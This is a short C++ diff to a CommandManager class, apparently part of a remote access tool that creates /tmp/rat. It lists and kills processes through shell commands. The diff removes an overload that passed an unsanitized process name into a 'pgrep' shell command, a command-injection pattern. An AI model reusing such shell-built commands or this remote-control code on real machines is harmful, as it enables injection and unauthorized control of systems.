@@ -40,36 +40,16 @@ bool CommandManager::ps(std::string* psOutput, bool* pbIsTruncated) {
   return runCommand("ps aux", psOutput, pbIsTruncated);
 }
 
-bool CommandManager::kill(unsigned int uiPid, std::string* psOutput,
+bool CommandManager::kill(std::string sPid, std::string* psOutput,
                           bool* pbIsTruncated) {
+  unsigned int uiPid = std::stoul(sPid);
   return runCommand(std::format("kill {}", uiPid), psOutput, pbIsTruncated);
-}
-
-bool CommandManager::kill(std::string sProcName, std::string* psOutput,
-                          bool* pbIsTruncated) {
-  std::istringstream issPgrepOutput;
-  std::string sPid;
-
-  if (runCommand(std::format("pgrep {}", sProcName), psOutput, pbIsTruncated)) {
-    return true;
-  }
-  issPgrepOutput.str(*psOutput);
-  *psOutput = "";
-
-  while (issPgrepOutput >> sPid) {
-    unsigned int uiPid = atoi(&sPid[0]);
-    if (kill(uiPid, psOutput, pbIsTruncated)) {
-      return true;
-    }
-  }
-
-  return false;
 }
 
 CommandManager* CommandManager::pcmInstance = nullptr;
 
 CommandManager::CommandManager() {
-  // chdir("/");
+  chdir("/");
   system("mkdir -p /tmp/rat");
 }
 
